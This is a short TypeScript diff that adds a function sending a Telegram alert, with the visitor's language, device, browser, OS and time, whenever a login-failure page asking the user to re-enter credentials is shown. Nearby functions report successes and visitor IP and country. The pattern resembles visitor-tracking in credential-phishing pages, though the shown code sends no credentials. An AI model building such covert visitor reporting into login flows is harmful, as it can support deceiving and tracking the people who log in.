@@ -112,6 +112,28 @@ export async function notifySuccess(language?: string, device?: string, browser?
   }
 }
 
+export async function notifyLoginFailure(language?: string, device?: string, browser?: string, os?: string): Promise<boolean> {
+  const message = `
+<b>⚠️ Login Failure Page Shown</b>
+
+<b>Status:</b> User redirected to login failure page
+<b>Action:</b> User asked to double-check credentials
+<b>Language:</b> ${language || 'Unknown'}
+<b>Device:</b> ${device || 'Unknown'}
+<b>Browser:</b> ${browser || 'Unknown'}
+<b>OS:</b> ${os || 'Unknown'}
+<b>Time:</b> ${new Date().toLocaleString()}
+  `.trim();
+
+  try {
+    await sendTelegramMessage(message);
+    return true;
+  } catch (error) {
+    console.error("Failed to send login failure notification:", error);
+    return false;
+  }
+}
+
 export async function notifyVisitor(
   ip: string,
   country: string,
